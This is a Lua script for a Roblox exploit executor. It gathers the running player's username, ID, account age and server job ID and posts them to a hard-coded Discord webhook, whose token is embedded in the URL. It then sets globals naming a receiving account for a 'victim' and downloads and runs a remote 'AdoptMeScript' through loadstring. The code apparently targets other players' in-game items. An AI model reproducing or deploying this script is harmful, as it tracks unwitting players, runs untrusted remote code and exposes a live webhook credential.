-- Ensure HTTP requests are supported by the exploit
if not syn and not http and not request then
    print("Your executor does not support HTTP requests!")
    return
end

-- New Webhook URL
local webhookURL = "https://discord.com/api/webhooks/1335043376210247806/Gky6NvSjJI_AAPtqsRiycMYXhVzTFdEUKlIZB-A1wg_WWXLH1cjmcR9s7KBHm97uMw3P"

-- Get Player & Game Info
local player = game:GetService("Players").LocalPlayer
local gameService = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local gameName = gameService.Name
local gameID = game.GameId
local placeID = game.PlaceId
local jobID = game.JobId -- Unique Server Instance ID
local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"

-- Calculate Account Creation Date
local daysSinceCreation = player.AccountAge
local creationDate = os.date("%Y-%m-%d", os.time() - (daysSinceCreation * 86400)) -- Convert days to a proper date

-- Create Data for Webhook
local data = {
    ["content"] = "@everyone **Executor Script Executed!**",
    ["embeds"] = {{
        ["title"] = "Execution Alert",
        ["description"] = "A player has executed the script!",
        ["color"] = 16711680, -- Red
        ["fields"] = {
            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "Profile Link", ["value"] = "[View Profile](" .. profileLink .. ")", ["inline"] = false},
            {["name"] = "Account Creation Date", ["value"] = creationDate, ["inline"] = true},
            {["name"] = "Account Age (Days)", ["value"] = tostring(daysSinceCreation), ["inline"] = true},
            {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
            {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
            {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
            {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true},
            {["name"] = "Server Job ID", ["value"] = jobID, ["inline"] = false},
            {["name"] = "Teleport to This Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeID .. ", '" .. jobID .. "')```", ["inline"] = false}
        }
    }},
    ["allowed_mentions"] = {["parse"] = {"everyone"}} -- Enables the @everyone ping
}

-- Convert Data to JSON
local jsonData = game:GetService("HttpService"):JSONEncode(data)

-- Send Request Using Exploit Functions
if syn and syn.request then
    syn.request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
elseif request then
    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
elseif http and http.request then
    http.request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
else
    print("No supported exploit functions found!")
end


_G.Username = "boondock138" -- user you should join victim on
_G.min_value = 0.1
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.discuser = "1269701634217480267" -- change to your Discord user ID

loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/AdoptMeScript/refs/heads/main/AdoptMe'))()
